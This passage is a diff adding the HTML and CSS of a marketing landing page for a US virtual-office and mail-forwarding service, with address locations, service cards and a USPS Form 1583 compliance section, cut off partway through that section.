@@ -1,0 +1,1494 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Select Your Brand — Welcome Portal. Choose your preferred brand to continue.">
+    <meta name="robots" content="index, follow">
+    <meta property="og:title" content="Select Your Brand — Welcome Portal">
+    <meta property="og:description" content="Select Your Brand — Welcome Portal. Choose your preferred brand to continue.">
+    <title>Select Your Brand — Welcome Portal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <style>
+        /* CSS Reset & Variables */
+        :root {
+            --primary: #1e3a8a;
+            --primary-hover: #1d4ed8;
+            --secondary: #0f172a;
+            --accent: #2563eb;
+            --accent-light: #eff6ff;
+            --success: #16a34a;
+            --text-main: #334155;
+            --text-dark: #0f172a;
+            --text-light: #64748b;
+            --bg-light: #f8fafc;
+            --bg-white: #ffffff;
+            --border-color: #e2e8f0;
+            --shadow-sm: 0 1px 3px rgba(0,0,0,0.1);
+            --shadow-md: 0 4px 6px -1px rgba(0,0,0,0.1), 0 2px 4px -1px rgba(0,0,0,0.06);
+            --shadow-lg: 0 10px 15px -3px rgba(0,0,0,0.1), 0 4px 6px -2px rgba(0,0,0,0.05);
+            --radius-sm: 6px;
+            --radius-md: 10px;
+            --radius-lg: 16px;
+            --radius-2xl: 24px;
+            --ring-color: rgba(37, 99, 235, 0.5);
+        }
+
+        *, *::before, *::after {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        html {
+            scroll-behavior: smooth;
+            font-family: system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Open Sans", "Helvetica Neue", sans-serif;
+            color: var(--text-main);
+            background-color: var(--bg-light);
+            line-height: 1.6;
+        }
+
+        body {
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+
+        /* Typography */
+        h1, h2, h3, h4 {
+            color: var(--text-dark);
+            font-weight: 700;
+            line-height: 1.25;
+        }
+
+        h1 { font-size: 2.75rem; }
+        h2 { font-size: 2.25rem; }
+        h3 { font-size: 1.5rem; }
+        h4 { font-size: 1.125rem; }
+
+        p { margin-bottom: 1rem; }
+        p:last-child { margin-bottom: 0; }
+
+        a {
+            color: var(--accent);
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+        a:hover { color: var(--primary-hover); }
+
+        /* Container */
+        .container {
+            width: 100%;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 1.5rem;
+        }
+
+        /* Top Announcement Bar */
+        .top-bar {
+            background-color: var(--secondary);
+            color: #f1f5f9;
+            font-size: 0.875rem;
+            padding: 0.5rem 0;
+            text-align: center;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .top-bar-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 0.5rem;
+        }
+
+        .top-bar-badge {
+            background-color: rgba(37, 99, 235, 0.3);
+            color: #93c5fd;
+            padding: 0.15rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        /* Header Navigation */
+        header {
+            background-color: var(--bg-white);
+            border-bottom: 1px solid var(--border-color);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .nav-wrapper {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            height: 80px;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.75rem;
+            font-size: 1.35rem;
+            font-weight: 800;
+            color: var(--primary);
+            text-transform: uppercase;
+            letter-spacing: -0.5px;
+        }
+
+        .logo svg {
+            width: 36px;
+            height: 36px;
+            fill: var(--primary);
+        }
+
+        .nav-links {
+            display: flex;
+            align-items: center;
+            gap: 1.75rem;
+            list-style: none;
+        }
+
+        .nav-links a {
+            color: var(--text-dark);
+            font-weight: 600;
+            font-size: 0.95rem;
+        }
+
+        .nav-links a:hover {
+            color: var(--accent);
+        }
+
+        /* Buttons */
+        .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            padding: 0.75rem 1.5rem;
+            font-size: 1rem;
+            font-weight: 600;
+            border-radius: var(--radius-md);
+            cursor: pointer;
+            border: 2px solid transparent;
+            transition: all 0.2s ease-in-out;
+            text-align: center;
+        }
+
+        .btn-primary {
+            background-color: var(--accent);
+            color: #ffffff !important;
+        }
+
+        .btn-primary:hover {
+            background-color: var(--primary-hover);
+            box-shadow: var(--shadow-md);
+        }
+
+        .btn-outline {
+            border-color: var(--border-color);
+            background-color: var(--bg-white);
+            color: var(--text-dark);
+        }
+
+        .btn-outline:hover {
+            border-color: var(--accent);
+            color: var(--accent);
+            background-color: var(--accent-light);
+        }
+
+        .btn-sm {
+            padding: 0.4rem 1rem;
+            font-size: 0.875rem;
+        }
+
+        /* Hero Section */
+        .hero {
+            padding: 5rem 0 4rem 0;
+            background: linear-gradient(135deg, #ffffff 0%, #f1f5f9 100%);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .hero-grid {
+            display: grid;
+            grid-template-columns: 1.2fr 0.8fr;
+            gap: 3rem;
+            align-items: center;
+        }
+
+        .hero-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 0.5rem;
+            background-color: var(--accent-light);
+            color: var(--accent);
+            padding: 0.4rem 0.8rem;
+            border-radius: 50px;
+            font-size: 0.875rem;
+            font-weight: 600;
+            margin-bottom: 1.25rem;
+            border: 1px solid rgba(37, 99, 235, 0.2);
+        }
+
+        .hero-title {
+            margin-bottom: 1.25rem;
+            letter-spacing: -0.5px;
+        }
+
+        .hero-subtitle {
+            font-size: 1.15rem;
+            color: var(--text-light);
+            margin-bottom: 2rem;
+            line-height: 1.6;
+        }
+
+        .hero-actions {
+            display: flex;
+            gap: 1rem;
+            align-items: center;
+            flex-wrap: wrap;
+            margin-bottom: 2rem;
+        }
+
+        .trust-pills {
+            display: flex;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+            padding-top: 1.5rem;
+            border-top: 1px solid var(--border-color);
+        }
+
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 0.4rem;
+            font-size: 0.85rem;
+            color: var(--text-light);
+            font-weight: 500;
+        }
+
+        .trust-item svg {
+            width: 18px;
+            height: 18px;
+            fill: var(--success);
+        }
+
+        /* Hero Card / Quick Quote Box */
+        .hero-card {
+            background: var(--bg-white);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-lg);
+            padding: 2rem;
+            box-shadow: var(--shadow-lg);
+        }
+
+        .hero-card-header {
+            margin-bottom: 1.5rem;
+            text-align: center;
+        }
+
+        .hero-card-header h3 {
+            font-size: 1.35rem;
+            margin-bottom: 0.25rem;
+        }
+
+        .hero-card-header p {
+            font-size: 0.875rem;
+            color: var(--text-light);
+        }
+
+        .form-group {
+            margin-bottom: 1.25rem;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.875rem;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 0.35rem;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 0.75rem;
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-sm);
+            font-size: 0.95rem;
+            background-color: var(--bg-light);
+            color: var(--text-dark);
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        .form-control:focus {
+            border-color: var(--accent);
+            background-color: var(--bg-white);
+        }
+
+        /* Section Commons */
+        section {
+            padding: 4.5rem 0;
+        }
+
+        .section-header {
+            text-align: center;
+            max-width: 750px;
+            margin: 0 auto 3.5rem auto;
+        }
+
+        .section-header .tag {
+            color: var(--accent);
+            font-weight: 700;
+            text-transform: uppercase;
+            font-size: 0.85rem;
+            letter-spacing: 1px;
+            margin-bottom: 0.5rem;
+            display: block;
+        }
+
+        .section-header h2 {
+            margin-bottom: 1rem;
+        }
+
+        .section-header p {
+            color: var(--text-light);
+            font-size: 1.05rem;
+        }
+
+        /* Features Grid */
+        .grid-3 {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 2rem;
+        }
+
+        .feature-card {
+            background-color: var(--bg-white);
+            padding: 2rem;
+            border-radius: var(--radius-md);
+            border: 1px solid var(--border-color);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+
+        .feature-card:hover {
+            transform: translateY(-4px);
+            box-shadow: var(--shadow-md);
+        }
+
+        .feature-icon {
+            width: 52px;
+            height: 52px;
+            border-radius: var(--radius-md);
+            background-color: var(--accent-light);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 1.25rem;
+        }
+
+        .feature-icon svg {
+            width: 26px;
+            height: 26px;
+            fill: var(--accent);
+        }
+
+        .feature-card h3 {
+            font-size: 1.2rem;
+            margin-bottom: 0.75rem;
+        }
+
+        .feature-card p {
+            color: var(--text-light);
+            font-size: 0.95rem;
+        }
+
+        /* Locations Grid */
+        .locations-bg {
+            background-color: var(--bg-white);
+            border-top: 1px solid var(--border-color);
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .location-card {
+            background: var(--bg-light);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            padding: 1.5rem;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .location-card-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 1rem;
+        }
+
+        .location-city {
+            font-weight: 700;
+            font-size: 1.15rem;
+            color: var(--text-dark);
+        }
+
+        .location-tag {
+            font-size: 0.75rem;
+            font-weight: 600;
+            padding: 0.2rem 0.5rem;
+            border-radius: 4px;
+            background-color: #e2e8f0;
+            color: #475569;
+        }
+
+        .location-address {
+            font-size: 0.9rem;
+            color: var(--text-light);
+            margin-bottom: 1.25rem;
+        }
+
+        .location-features {
+            list-style: none;
+            font-size: 0.85rem;
+            color: var(--text-main);
+            margin-bottom: 1.5rem;
+        }
+
+        .location-features li {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 0.4rem;
+        }
+
+        .location-features svg {
+            width: 14px;
+            height: 14px;
+            fill: var(--success);
+        }
+
+        /* Compliance & Process Section */
+        .process-steps {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 2rem;
+            position: relative;
+        }
+
+        .step-card {
+            background-color: var(--bg-white);
+            border: 1px solid var(--border-color);
+            padding: 2rem;
+            border-radius: var(--radius-md);
+            position: relative;
+        }
+
+        .step-number {
+            width: 40px;
+            height: 40px;
+            background-color: var(--primary);
+            color: #ffffff;
+            font-weight: 800;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.1rem;
+            margin-bottom: 1.25rem;
+        }
+
+        .compliance-notice-box {
+            background-color: #fffbe6;
+            border: 1px solid #ffe58f;
+            border-radius: var(--radius-md);
+            padding: 1.75rem;
+            margin-top: 3rem;
+            display: flex;
+            gap: 1.25rem;
+            align-items: flex-start;
+        }
+
+        .compliance-notice-box svg {
+            width: 32px;
+            height: 32px;
+            fill: #d48806;
+            flex-shrink: 0;
+        }
+
+        .compliance-notice-content h4 {
+            color: #873800;
+            margin-bottom: 0.4rem;
+        }
+
+        .compliance-notice-content p {
+            font-size: 0.925rem;
+            color: #614700;
+        }
+
+        /* Pricing Section */
+        .pricing-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 2rem;
+            align-items: stretch;
+        }
+
+        .pricing-card {
+            background-color: var(--bg-white);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-lg);
+            padding: 2.5rem 2rem;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .pricing-card.popular {
+            border: 2px solid var(--accent);
+            box-shadow: var(--shadow-lg);
+        }
+
+        .popular-badge {
+            position: absolute;
+            top: -14px;
+            left: 50%;
+            transform: translateX(-50%);
+            background-color: var(--accent);
+            color: #ffffff;
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            padding: 0.3rem 1rem;
+            border-radius: 50px;
+        }
+
+        .plan-name {
+            font-size: 1.35rem;
+            font-weight: 700;
+            margin-bottom: 0.5rem;
+        }
+
+        .plan-desc {
+            font-size: 0.875rem;
+            color: var(--text-light);
+            margin-bottom: 1.5rem;
+            min-height: 40px;
+        }
+
+        .plan-price {
+            display: flex;
+            align-items: baseline;
+            gap: 0.25rem;
+            margin-bottom: 1.75rem;
+            padding-bottom: 1.5rem;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .price-currency {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--text-dark);
+        }
+
+        .price-amount {
+            font-size: 3rem;
+            font-weight: 800;
+            color: var(--text-dark);
+            line-height: 1;
+        }
+
+        .price-period {
+            color: var(--text-light);
+            font-size: 0.9rem;
+        }
+
+        .plan-features {
+            list-style: none;
+            margin-bottom: 2rem;
+            flex-grow: 1;
+        }
+
+        .plan-features li {
+            font-size: 0.925rem;
+            display: flex;
+            align-items: center;
+            gap: 0.6rem;
+            margin-bottom: 0.8rem;
+            color: var(--text-main);
+        }
+
+        .plan-features svg {
+            width: 18px;
+            height: 18px;
+            fill: var(--success);
+            flex-shrink: 0;
+        }
+
+        .pricing-disclaimer {
+            text-align: center;
+            font-size: 0.85rem;
+            color: var(--text-light);
+            margin-top: 2rem;
+        }
+
+        /* Accordion FAQ */
+        .faq-list {
+            max-width: 800px;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 1rem;
+        }
+
+        details {
+            background-color: var(--bg-white);
+            border: 1px solid var(--border-color);
+            border-radius: var(--radius-md);
+            overflow: hidden;
+        }
+
+        summary {
+            padding: 1.25rem 1.5rem;
+            font-weight: 600;
+            font-size: 1.05rem;
+            color: var(--text-dark);
+            cursor: pointer;
+            list-style: none;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            user-select: none;
+        }
+
+        summary::-webkit-details-marker {
+            display: none;
+        }
+
+        summary::after {
+            content: "+";
+            font-size: 1.5rem;
+            font-weight: 400;
+            color: var(--accent);
+        }
+
+        details[open] summary::after {
+            content: "−";
+        }
+
+        details[open] summary {
+            border-bottom: 1px solid var(--border-color);
+            background-color: var(--bg-light);
+        }
+
+        .faq-answer {
+            padding: 1.25rem 1.5rem;
+            font-size: 0.95rem;
+            color: var(--text-main);
+            background-color: var(--bg-white);
+        }
+
+        /* Contact & Transparency Section */
+        .contact-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 3rem;
+            background-color: var(--bg-white);
+            border-radius: var(--radius-lg);
+            border: 1px solid var(--border-color);
+            padding: 3rem;
+            box-shadow: var(--shadow-sm);
+        }
+
+        .contact-info h3 {
+            margin-bottom: 1rem;
+        }
+
+        .contact-details {
+            list-style: none;
+            margin: 1.5rem 0;
+        }
+
+        .contact-details li {
+            display: flex;
+            align-items: flex-start;
+            gap: 0.75rem;
+            margin-bottom: 1rem;
+            font-size: 0.95rem;
+        }
+
+        .contact-details svg {
+            width: 20px;
+            height: 20px;
+            fill: var(--accent);
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        /* Footer & Legal Modals / Tabs */
+        footer {
+            background-color: var(--secondary);
+            color: #94a3b8;
+            padding: 4rem 0 2rem 0;
+            font-size: 0.875rem;
+            margin-top: auto;
+        }
+
+        .footer-grid {
+            display: grid;
+            grid-template-columns: 2fr 1fr 1fr 1fr;
+            gap: 3rem;
+            margin-bottom: 3rem;
+        }
+
+        .footer-logo {
+            color: #ffffff;
+            font-size: 1.25rem;
+            font-weight: 800;
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin-bottom: 1rem;
+        }
+
+        .footer-logo svg {
+            width: 28px;
+            height: 28px;
+            fill: #ffffff;
+        }
+
+        .footer-col h4 {
+            color: #ffffff;
+            margin-bottom: 1.25rem;
+            font-size: 0.95rem;
+        }
+
+        .footer-col ul {
+            list-style: none;
+        }
+
+        .footer-col ul li {
+            margin-bottom: 0.6rem;
+        }
+
+        .footer-col ul a {
+            color: #94a3b8;
+        }
+
+        .footer-col ul a:hover {
+            color: #ffffff;
+        }
+
+        .footer-bottom {
+            padding-top: 2rem;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            text-align: center;
+            font-size: 0.8rem;
+            color: #64748b;
+        }
+
+        .policy-modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(15, 23, 42, 0.75);
+            z-index: 1000;
+            overflow-y: auto;
+            padding: 2rem 1rem;
+        }
+
+        .policy-modal:target {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .policy-content {
+            background-color: var(--bg-white);
+            max-width: 800px;
+            width: 100%;
+            border-radius: var(--radius-md);
+            padding: 2.5rem;
+            position: relative;
+            max-height: 85vh;
+            overflow-y: auto;
+            box-shadow: var(--shadow-lg);
+            color: var(--text-main);
+        }
+
+        .policy-content h2 {
+            margin-bottom: 1rem;
+        }
+
+        .policy-close {
+            position: absolute;
+            top: 1.25rem;
+            right: 1.5rem;
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: var(--text-light);
+            text-decoration: none;
+        }
+
+        .policy-close:hover {
+            color: var(--text-dark);
+        }
+
+        /* Responsive Breakpoints */
+        @media (max-width: 992px) {
+            .hero-grid {
+                grid-template-columns: 1fr;
+            }
+            .contact-grid {
+                grid-template-columns: 1fr;
+            }
+            .footer-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            h1 { font-size: 2.1rem; }
+            h2 { font-size: 1.75rem; }
+            .nav-links { display: none; }
+            .footer-grid { grid-template-columns: 1fr; }
+            .top-bar-content { justify-content: center; text-align: center; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- Top Announcement & Compliance Bar -->
+    <div class="top-bar">
+        <div class="container top-bar-content">
+            <div>
+                <span class="top-bar-badge">USPS Authorized CMRA</span>
+                <span>Official US Commercial Street Address Provider • Fully USPS 1583 Compliant</span>
+            </div>
+            <div>
+                <span>Support Line: <strong>+1 (800) 555-0199</strong> (Mon–Fri 8AM–8PM EST)</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Navigation Header -->
+    <header>
+        <div class="container nav-wrapper">
+            <a href="#" class="logo">
+                <svg viewBox="0 0 24 24">
+                    <path d="M12 2L2 7l10 5 10-5-10-5zM2 17l10 5 10-5M2 12l10 5 10-5"/>
+                </svg>
+                Apex Virtual Office
+            </a>
+            <ul class="nav-links">
+                <li><a href="#services">Services</a></li>
+                <li><a href="#locations">US Locations</a></li>
+                <li><a href="#compliance">USPS Compliance</a></li>
+                <li><a href="#pricing">Pricing Plans</a></li>
+                <li><a href="#faq">FAQ</a></li>
+                <li><a href="#contact">Contact Support</a></li>
+            </ul>
+            <div>
+                <a href="#pricing" class="btn btn-primary btn-sm">Reserve Address</a>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="container hero-grid">
+            <div class="hero-left">
+                <div class="hero-badge">
+                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                    </svg>
+                    Google Ads Policy Compliant Business Solutions
+                </div>
+                <h1 class="hero-title">Establish Your Official US Commercial Business Address</h1>
+                <p class="hero-subtitle">
+                    Get a real commercial street address in top US economic hubs (NYC, LA, Austin, Miami, Chicago). Receive, scan, and forward mail digitally with full USPS 1583 compliance. No PO Boxes.
+                </p>
+                <div class="hero-actions">
+                    <a href="#pricing" class="btn btn-primary">View Transparent Plans</a>
+                    <a href="#compliance" class="btn btn-outline">USPS Verification Guide</a>
+                </div>
+                <div class="trust-pills">
+                    <div class="trust-item">
+                        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                        No Hidden Setup Fees
+                    </div>
+                    <div class="trust-item">
+                        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                        30-Day Refund Guarantee
+                    </div>
+                    <div class="trust-item">
+                        <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+                        Official USPS Form 1583 Portal
+                    </div>
+                </div>
+            </div>
+
+            <!-- Quick Inquiry Card -->
+            <div class="hero-card">
+                <div class="hero-card-header">
+                    <h3>Get Started Instantly</h3>
+                    <p>Select your location & receive a custom proposal</p>
+                </div>
+                <form action="#contact" method="GET">
+                    <div class="form-group">
+                        <label for="preferred-state">Select Target US State / Location</label>
+                        <select id="preferred-state" class="form-control" required>
+                            <option value="">-- Choose US Location --</option>
+                            <option value="ny">New York, NY (Wall St / Midtown)</option>
+                            <option value="ca">Los Angeles, CA (Wilshire Blvd)</option>
+                            <option value="tx">Austin, TX (Congress Ave)</option>
+                            <option value="fl">Miami, FL (Brickell Ave)</option>
+                            <option value="il">Chicago, IL (Michigan Ave)</option>
+                            <option value="wy">Sheridan, WY (Tax Friendly Hub)</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="business-type">Entity Type</label>
+                        <select id="business-type" class="form-control">
+                            <option value="llc">LLC / Corporation</option>
+                            <option value="sole">Sole Proprietorship</option>
+                            <option value="startup">International Business / Non-US Founder</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label for="contact-email">Business Email</label>
+                        <input type="email" id="contact-email" class="form-control" placeholder="name@company.com" required>
+                    </div>
+                    <button type="submit" class="btn btn-primary" style="width: 100%;">Check Address Availability</button>
+                </form>
+            </div>
+        </div>
+    </section>
+
+    <!-- Services Grid -->
+    <section id="services">
+        <div class="container">
+            <div class="section-header">
+                <span class="tag">Our Core Offerings</span>
+                <h2>Comprehensive US Virtual Office Infrastructure</h2>
+                <p>Everything your business needs to establish a legitimate, compliant, and professional operational presence in the United States.</p>
+            </div>
+
+            <div class="grid-3">
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+                    </div>
+                    <h3>Commercial Street Address</h3>
+                    <p>Real physical office building addresses suitable for LLC/Inc registrations, banking compliance, and official state filings. Zero PO Boxes.</p>
+                </div>
+
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
+                    </div>
+                    <h3>Same-Day Digital Mail Scanning</h3>
+                    <p>High-resolution PDF scanning of mail envelopes and contents uploaded directly to your secure 256-bit encrypted digital portal within hours of receipt.</p>
+                </div>
+
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24"><path d="M20 8h-3V4H3c-1.1 0-2 .9-2 2v11h2c0 1.66 1.34 3 3 3s3-1.34 3-3h6c0 1.66 1.34 3 3 3s3-1.34 3-3h2v-5l-3-4zM6 18.5c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5zm13.5-9l1.96 2.5H17V9.5h2.5zm-1.5 9c-.83 0-1.5-.67-1.5-1.5s.67-1.5 1.5-1.5 1.5.67 1.5 1.5-.67 1.5-1.5 1.5z"/></svg>
+                    </div>
+                    <h3>Physical Mail Forwarding</h3>
+                    <p>Consolidated weekly or monthly mail & package forwarding to any destination domestic or worldwide via USPS, FedEx, or DHL with tracking.</p>
+                </div>
+
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24"><path d="M6.62 10.79c1.44 2.83 3.76 5.14 6.59 6.59l2.2-2.2c.27-.27.67-.36 1.02-.24 1.12.37 2.33.57 3.57.57.55 0 1 .45 1 1V20c0 .55-.45 1-1 1-9.39 0-17-7.61-17-17 0-.55.45-1 1-1h3.5c.55 0 1 .45 1 1 0 1.25.2 2.45.57 3.57.11.35.03.74-.25 1.02l-2.2 2.2z"/></svg>
+                    </div>
+                    <h3>Dedicated Phone & Live Answering</h3>
+                    <p>Local US area code business phone numbers with custom IVR automated attendant, voicemail-to-email, or live professional US receptionists.</p>
+                </div>
+
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24"><path d="M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-5 14H7v-2h7v2zm3-4H7v-2h10v2zm0-4H7V7h10v2z"/></svg>
+                    </div>
+                    <h3>Registered Agent Services</h3>
+                    <p>Official State Registered Agent representation included to handle service of process, legal notices, and compliance deadlines seamlessly.</p>
+                </div>
+
+                <div class="feature-card">
+                    <div class="feature-icon">
+                        <svg viewBox="0 0 24 24"><path d="M19 4h-1V2h-2v2H8V2H6v2H5c-1.11 0-1.99.9-1.99 2L3 20c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V6c0-1.1-.89-2-2-2zm0 16H5V9h14v11z"/></svg>
+                    </div>
+                    <h3>On-Demand Meeting Rooms</h3>
+                    <p>Book fully equipped conference rooms, day offices, and executive suites by the hour or day when you need to meet clients in person.</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Locations Section -->
+    <section id="locations" class="locations-bg">
+        <div class="container">
+            <div class="section-header">
+                <span class="tag">Prime US Addresses</span>
+                <h2>Select Your Preferred US Business Hub</h2>
+                <p>All addresses are real Class-A commercial office buildings certified as Commercial Mail Receiving Agencies (CMRA).</p>
+            </div>
+
+            <div class="grid-3">
+                <div class="location-card">
+                    <div>
+                        <div class="location-card-header">
+                            <span class="location-city">New York, NY</span>
+                            <span class="location-tag">Financial District</span>
+                        </div>
+                        <div class="location-address">100 Wall Street, Floor 12, New York, NY 10005</div>
+                        <ul class="location-features">
+                            <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Commercial Office Suite</li>
+                            <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Same-day Scan & Upload</li>
+                            <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Daily USPS Collection</li>
+                        </ul>
+                    </div>
+                    <a href="#pricing" class="btn btn-outline btn-sm">Select NY Location</a>
+                </div>
+
+                <div class="location-card">
+                    <div>
+                        <div class="location-card-header">
+                            <span class="location-city">Los Angeles, CA</span>
+                            <span class="location-tag">Downtown Tech Center</span>
+                        </div>
+                        <div class="location-address">900 Wilshire Blvd, Suite 800, Los Angeles, CA 90017</div>
+                        <ul class="location-features">
+                            <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Class-A Commercial Facility</li>
+                            <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> International Shipping Available</li>
+                            <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Meeting Room Discounts</li>
+                        </ul>
+                    </div>
+                    <a href="#pricing" class="btn btn-outline btn-sm">Select LA Location</a>
+                </div>
+
+                <div class="location-card">
+                    <div>
+                        <div class="location-card-header">
+                            <span class="location-city">Austin, TX</span>
+                            <span class="location-tag">Congress Innovation</span>
+                        </div>
+                        <div class="location-address">600 Congress Ave, 14th Floor, Austin, TX 78701</div>
+                        <ul class="location-features">
+                            <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Preferred Tax Business Location</li>
+                            <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Certified CMRA Mail Facility</li>
+                            <li><svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg> Unlimited Envelope Scans</li>
+                        </ul>
+                    </div>
+                    <a href="#pricing" class="btn btn-outline btn-sm">Select Austin Location</a>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- USPS Form 1583 Compliance & Transparency Section -->
+    <section id="compliance">
+        <div class="container">
+            <div class="section-header">
+                <span class="tag">US Federal Regulatory Standard</span>
+                <h2>100% USPS 1583 & Legal Compliance</h2>
+                <p>To follow United States Postal Service (USPS) regulations and Google Ads transparency policies, all mail forwarding providers must verify customer identity prior to processing commercial mail.</p>
+            </div>
+
+            <div class="process-steps">
+                <div class="step-card">
+                    <div class="step-number">1</div>
+                    <h3>Select Plan & Address</h3>
+                    <p>Choose your desired business address and select a monthly or annual subscription. Instant account creation.</p>
+                </div>
+
+                <div class="step-card">
+                    <div class="step-number">2</div>
+                    <h3>Complete USPS Form 1583</h3>
